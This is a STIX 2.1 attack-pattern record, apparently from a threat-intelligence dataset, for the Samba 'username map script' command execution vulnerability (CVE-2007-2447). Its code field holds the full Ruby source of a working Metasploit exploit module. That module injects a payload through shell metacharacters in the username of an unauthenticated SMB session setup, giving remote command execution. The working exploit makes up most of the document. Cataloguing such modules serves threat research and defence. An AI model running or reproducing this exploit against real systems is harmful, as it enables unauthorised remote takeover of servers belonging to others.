{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--35a3e457-9a40-4c08-99ac-ece43541524f",
    "created": "2024-08-14T17:04:53.005293Z",
    "modified": "2024-08-14T17:04:53.005297Z",
    "name": "Samba \"username map script\" Command Execution",
    "description": " This module exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default \"username map script\" configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands.  No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication! ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/samba/usermap_script.rb",
            "external_id": "usermap_script.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-2447"
        },
        {
            "source_name": "reference",
            "url": "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534"
        },
        {
            "source_name": "reference",
            "url": "http://samba.org/samba/security/CVE-2007-2447.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::SMB::Client\n\n  # For our customized version of session_setup_no_ntlmssp\n  CONST = Rex::Proto::SMB::Constants\n  CRYPT = Rex::Proto::SMB::Crypt\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Samba \"username map script\" Command Execution',\n      'Description'    => %q{\n          This module exploits a command execution vulnerability in Samba\n        versions 3.0.20 through 3.0.25rc3 when using the non-default\n        \"username map script\" configuration option. By specifying a username\n        containing shell meta characters, attackers can execute arbitrary\n        commands.\n\n        No authentication is needed to exploit this vulnerability since\n        this option is used to map usernames prior to authentication!\n      },\n      'Author'         => [ 'jduck' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2007-2447' ],\n          [ 'OSVDB', '34700' ],\n          [ 'BID', '23972' ],\n          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534' ],\n          [ 'URL', 'http://samba.org/samba/security/CVE-2007-2447.html' ]\n        ],\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => true, # root or nobody user\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              # *_perl and *_ruby work if they are installed\n              # mileage may vary from system to system..\n            }\n        },\n      'Targets'        =>\n        [\n          [ \"Automatic\", { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2007-05-14'))\n\n    register_options(\n      [\n        Opt::RPORT(139)\n      ])\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n\n  def exploit\n\n    vprint_status('Use Rex client (SMB1 only) since this module is not compatible with RubySMB client')\n    connect(versions: [1])\n\n    # lol?\n    username = \"/=`nohup \" + payload.encoded + \"`\"\n    begin\n      simple.client.negotiate(false)\n      simple.client.session_setup_no_ntlmssp(username, rand_text(16), datastore['SMBDomain'], false)\n    rescue ::Timeout::Error, XCEPT::LoginError\n      # nothing, it either worked or it didn't ;)\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-05-14",
    "x_mitre_platforms": [
        "['unix']"
    ]
}